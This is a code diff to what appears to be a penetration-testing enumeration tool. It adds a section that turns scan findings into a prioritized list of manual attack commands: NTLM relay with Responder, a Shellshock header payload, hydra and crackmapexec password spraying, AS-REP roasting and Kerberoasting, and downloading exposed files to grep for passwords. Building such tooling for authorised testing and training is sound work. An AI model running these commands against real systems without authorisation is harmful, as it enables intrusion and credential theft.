@@ -11,11 +11,12 @@ Handles:
 
 import json
 import logging
+import re
 import sys
 from dataclasses import dataclass, field
 from datetime import datetime, timezone
 from pathlib import Path
-from typing import Dict, List, Optional, Set
+from typing import Dict, List, Optional, Set, Tuple
 
 
 # ---------------------------------------------------------------------------
@@ -464,6 +465,33 @@ class Session:
             "",
         ]
 
+        # ── Attack Path ───────────────────────────────────────────────
+        # Built dynamically from ALL session findings — ordered by priority.
+        # Every entry is a MANUAL command; nothing runs automatically.
+        attack_steps = self._build_attack_path()
+        if attack_steps:
+            _sev_emoji = {
+                "critical": "🔴",
+                "high":     "🟠",
+                "medium":   "🟡",
+                "info":     "🔵",
+            }
+            lines += [
+                "## 🎯 Prioritized Attack Path",
+                "",
+                "> Auto-generated from enumeration findings. Run these in order.  ",
+                "> Every command below is **manual** — nothing was executed automatically.",
+                "",
+            ]
+            for sev, desc, cmd in attack_steps:
+                emoji = _sev_emoji.get(sev, "⚪")
+                lines.append(f"#### {emoji} `[{sev.upper()}]` {desc}")
+                lines.append("```bash")
+                lines.append(cmd)
+                lines.append("```")
+                lines.append("")
+            lines += ["---", ""]
+
         # ── Table of Contents ─────────────────────────────────────────
         # Anchor format: GitHub-flavored Markdown (emoji stripped, lowercase,
         # spaces → hyphens).  Works in Obsidian, Typora, and GitHub preview.
@@ -754,6 +782,277 @@ class Session:
 
         notes_path.write_text("\n".join(lines), encoding="utf-8")
         self.log.info("Notes written → %s", notes_path)
+
+    # ------------------------------------------------------------------
+    # Attack Path Synthesis
+    # ------------------------------------------------------------------
+
+    def _build_attack_path(self) -> List[Tuple[str, str, str]]:
+        """
+        Synthesize ALL session findings into a prioritized list of manual steps.
+        Returns [(severity, description, command), ...] ordered critical → info.
+        Nothing here runs automatically — every entry is a manual command.
+        """
+        steps: List[Tuple[str, str, str]] = []
+        ip         = self.info.ip
+        domain     = self.info.domain or ""
+        users_file = self.target_dir / "users.txt"
+        ldap_dir   = self.target_dir / "ldap"
+        uf         = str(users_file) if users_file.exists() else "<users.txt>"
+
+        # ── CRITICAL ─────────────────────────────────────────────────────────
+        _seen: set = set()
+
+        def _once(key: str) -> bool:
+            if key in _seen:
+                return False
+            _seen.add(key)
+            return True
+
+        for note in self.info.notes:
+            nl = note.lower()
+            if _once("ntlm_relay") and re.search(r'smb signing disabled|ntlm relay', nl):
+                steps.append((
+                    "critical",
+                    "NTLM relay viable — SMB signing disabled",
+                    f"sudo responder -I tun0 -wd\n"
+                    f"  impacket-ntlmrelayx -t smb://{ip} -smb2support",
+                ))
+            if _once("eternalblue") and re.search(r'smbv1.*eternalblue|ms17-010', nl):
+                steps.append((
+                    "critical",
+                    "SMBv1 detected — verify EternalBlue (MS17-010)",
+                    f"nmap -p 445 --script smb-vuln-ms17-010 {ip}",
+                ))
+            if _once("heartbleed") and "heartbleed" in nl:
+                steps.append((
+                    "critical",
+                    "Heartbleed (CVE-2014-0160) — memory leak, creds extractable",
+                    f"nmap -p 443 --script ssl-heartbleed {ip}",
+                ))
+
+        for url in self.info.cgi_scripts_found:
+            steps.append((
+                "critical",
+                f"CGI script — test Shellshock: {url}",
+                f'curl -H "User-Agent: () {{ :; }}; echo; /usr/bin/id" {url}',
+            ))
+
+        # SSH CVEs
+        for note in self.info.notes:
+            m = re.search(r'HIGH: SSH CVEs detected:\s*(\[.*?\])', note)
+            if m:
+                steps.append((
+                    "critical",
+                    f"SSH CVEs: {m.group(1)} — research and verify exploitability",
+                    f"searchsploit openssh",
+                ))
+                break
+
+        # ── HIGH ─────────────────────────────────────────────────────────────
+
+        # Readable SMB shares
+        for share in self.info.shares_found:
+            steps.append((
+                "high",
+                f"Readable SMB share: '{share}'",
+                f"smbclient '//{ip}/{share}' -N -c 'ls'",
+            ))
+
+        # FTP anonymous
+        for note in self.info.notes:
+            if _once("ftp_anon") and re.search(r'ftp.*anonymous.*permitted|anonymous.*ftp.*login', note, re.I):
+                steps.append((
+                    "high",
+                    "FTP anonymous login permitted",
+                    f"wget -m ftp://anonymous:anonymous@{ip}/",
+                ))
+                break
+
+        # SSH password auth
+        for note in self.info.notes:
+            if _once("ssh_passauth") and re.search(r'ssh password auth enabled', note, re.I):
+                steps.append((
+                    "high",
+                    "SSH password auth enabled — brute-force viable",
+                    f"hydra -L {uf} -P /usr/share/wordlists/rockyou.txt ssh://{ip} -t 4 -w 3",
+                ))
+                break
+
+        # NFS exports
+        for note in self.info.notes:
+            m = re.search(r'NFS export:\s*\S+:([^\s—]+)', note)
+            if m:
+                export = m.group(1)
+                steps.append((
+                    "high",
+                    f"NFS export accessible: {export}",
+                    f"sudo mount -t nfs {ip}:{export} /mnt/nfs_enum && ls -la /mnt/nfs_enum/",
+                ))
+
+        # Sensitive/high-value web content
+        seen_paths: set = set()
+        for note in self.info.notes:
+            m = re.search(r'SENSITIVE FILE:\s*(\S+)', note)
+            if m:
+                path = m.group(1)
+                if path not in seen_paths:
+                    seen_paths.add(path)
+                    steps.append((
+                        "high",
+                        f"Sensitive file in web root: {path}",
+                        f"curl -so /tmp/loot_{Path(path).name} http://{ip}{path} && file /tmp/loot_{Path(path).name}",
+                    ))
+            m2 = re.search(r'HIGH-VALUE PATH:\s*(\S+)', note)
+            if m2:
+                path = m2.group(1)
+                if path not in seen_paths:
+                    seen_paths.add(path)
+                    steps.append((
+                        "high",
+                        f"High-value web path: {path}",
+                        f"curl -sv http://{ip}{path} 2>&1 | head -60",
+                    ))
+
+        # Web file download hints
+        for note in self.info.notes:
+            m = re.search(r'DOWNLOAD FILE:\s*(https?://\S+)', note)
+            if m:
+                url = m.group(1)
+                steps.append((
+                    "high",
+                    f"Downloadable file found: {url}",
+                    f"wget '{url}' -O /tmp/loot_file && file /tmp/loot_file && strings /tmp/loot_file | grep -i pass",
+                ))
+
+        # Database misconfigs
+        for note in self.info.notes:
+            if _once("db_empty") and re.search(r'database:.*(?:empty password|unauthenticated)', note, re.I):
+                clean = re.sub(r'^\[\d{2}:\d{2}:\d{2}\] ', '', note)
+                steps.append((
+                    "high",
+                    "Database with empty/no auth credentials",
+                    clean[:120],
+                ))
+
+        # ── MEDIUM ───────────────────────────────────────────────────────────
+
+        if self.info.users_found:
+            # Password policy check MUST come before any spray
+            if 445 in self.info.open_ports or 139 in self.info.open_ports:
+                steps.append((
+                    "medium",
+                    "CHECK PASSWORD POLICY before ANY spray (avoid account lockout!)",
+                    f"crackmapexec smb {ip} --pass-pol",
+                ))
+
+            if domain:
+                steps.append((
+                    "medium",
+                    "AS-REP Roasting — find accounts without Kerberos pre-auth",
+                    f"impacket-GetNPUsers {domain}/ -dc-ip {ip} -no-pass "
+                    f"-usersfile {uf} -format hashcat "
+                    f"-outputfile {ldap_dir}/asrep_hashes.txt",
+                ))
+                if 88 in self.info.open_ports:
+                    steps.append((
+                        "medium",
+                        "Kerbrute — validate users via Kerberos (no 4625 event, no lockout)",
+                        f"kerbrute userenum -d {domain} --dc {ip} {uf}",
+                    ))
+
+            # Spray across discovered open services
+            if 445 in self.info.open_ports or 139 in self.info.open_ports:
+                steps.append((
+                    "medium",
+                    "Credential spray — SMB (after policy check)",
+                    f"crackmapexec smb {ip} -u {uf} -p /usr/share/wordlists/rockyou.txt --no-bruteforce --continue-on-success",
+                ))
+            if 22 in self.info.open_ports:
+                steps.append((
+                    "medium",
+                    "Credential spray — SSH (rate-limited, 4 threads)",
+                    f"hydra -L {uf} -P /usr/share/wordlists/rockyou.txt ssh://{ip} -t 4 -w 3",
+                ))
+            if 5985 in self.info.open_ports or 5986 in self.info.open_ports:
+                steps.append((
+                    "medium",
+                    "Credential spray — WinRM (once creds found → shell)",
+                    f"crackmapexec winrm {ip} -u {uf} -p '<PASSWORD>'",
+                ))
+            if 1433 in self.info.open_ports:
+                steps.append((
+                    "medium",
+                    "MSSQL access test",
+                    f"crackmapexec mssql {ip} -u {uf} -p '<PASSWORD>'",
+                ))
+
+        # Kerberoasting (needs creds)
+        for note in self.info.notes:
+            if _once("kerberoast") and re.search(r'kerberoastable|serviceprincipalname.*spn', note, re.I) and domain:
+                steps.append((
+                    "medium",
+                    "Kerberoastable SPNs found — Kerberoast (requires ANY valid credentials)",
+                    f"impacket-GetUserSPNs {domain}/<USER>:<PASS> -dc-ip {ip} -request "
+                    f"-outputfile {ldap_dir}/kerberoast_hashes.txt",
+                ))
+                break
+
+        # LDAP description fields (classic OSCP cred storage)
+        for note in self.info.notes:
+            if _once("ldap_desc") and re.search(r'description.*password|accounts.*description', note, re.I):
+                steps.append((
+                    "medium",
+                    "LDAP description fields found — often contain plaintext passwords",
+                    f"grep -i 'description:' {ldap_dir}/ldap_descriptions.txt",
+                ))
+                break
+
+        # BloodHound — only when DC confirmed
+        if self.info.is_domain_controller and domain and _once("bloodhound"):
+            steps.append((
+                "medium",
+                "DC confirmed — collect BloodHound graph (once ANY credentials found)",
+                f"bloodhound-python -u <USER> -p <PASS> -d {domain} -ns {ip} -c All",
+            ))
+
+        # Credential reuse across ALL services
+        if self.info.users_found and _once("cred_reuse"):
+            open_svc_str = ", ".join(
+                str(p) for p in sorted(self.info.open_ports)
+                if p in {21, 22, 23, 80, 139, 443, 445, 1433, 3306, 3389, 5432, 5985, 5986}
+            )
+            if open_svc_str:
+                steps.append((
+                    "medium",
+                    f"Credential REUSE — test every found cred against every service ({open_svc_str})",
+                    f"crackmapexec smb {ip} -u <USER> -p <PASS> --continue-on-success",
+                ))
+
+        # ── INFO ─────────────────────────────────────────────────────────────
+        if self.info.web_paths:
+            steps.append((
+                "info",
+                f"{len(self.info.web_paths)} web paths discovered — manually review for LFI/SQLi/auth bypass",
+                f"cat {self.target_dir}/web/gobuster*.txt 2>/dev/null | sort | uniq",
+            ))
+
+        for d in self.info.domains_found:
+            if "." in d and d != domain and _once(f"host_{d}"):
+                steps.append((
+                    "info",
+                    f"Hostname/domain discovered: {d} — add to /etc/hosts",
+                    f"echo '{ip}  {d}' | sudo tee -a /etc/hosts",
+                ))
+
+        if self.info.domains_found and not domain:
+            steps.append((
+                "info",
+                "Domain detected but not confirmed — rerun with --domain flag",
+                f"python3 argus.py {ip} --domain {self.info.domains_found[0]}",
+            ))
+
+        return steps
 
     # ------------------------------------------------------------------
     # Internal setup
